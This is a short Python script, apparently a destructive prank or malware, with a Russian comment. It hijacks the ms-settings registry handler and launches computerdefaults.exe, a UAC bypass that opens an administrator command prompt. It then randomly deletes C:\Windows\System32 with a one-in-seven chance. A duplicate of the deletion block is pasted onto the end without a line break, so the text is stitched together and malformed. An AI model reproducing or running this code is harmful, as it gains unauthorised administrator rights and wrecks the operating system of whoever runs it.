import random
import os
import shutil

os.system("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f")
os.system("cmd /c reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v \"DelegateExecute\" /t REG_SZ /f")
os.system("cmd /c start computerdefaults.exe")  # Запустит командную строку с админ-правами

if random.randint(0, 6) == 1:
    shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)import random
import shutil
import os

if random.randint(0, 6) == 1:
    shutil.rmtree("C:\\Windows\\System32", ignore_errors=True)